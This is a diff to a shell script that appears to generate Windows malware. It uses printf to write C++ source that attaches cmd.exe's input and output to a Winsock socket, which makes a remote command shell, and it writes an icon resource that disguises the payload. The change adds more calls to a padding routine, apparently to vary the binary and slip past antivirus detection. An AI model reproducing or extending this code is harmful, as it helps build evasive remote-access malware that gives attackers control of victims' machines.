@@ -165,6 +165,7 @@ printf '#include <stdio.h>\n' >> program.cpp
 printf '#pragma comment(lib,"ws2_32")\n' >> program.cpp
 
 generatePadding
+generatePadding
 
 printf 'WSADATA wsaData;\n' >> program.cpp
 printf 'SOCKET sl;\n' >> program.cpp
@@ -189,7 +190,7 @@ printf ' sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) sl;\n' >> pro
 printf ' TCHAR commandLine[256] = "cmd.exe";\n' >> program.cpp
 printf ' CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL,NULL, &sui, &pi);\n' >> program.cpp
 printf '}\n' >> program.cpp
-
+generatePadding
 generatePadding
 printf "id ICON \"%s\"" $payload_icon  > icon.rc
 }
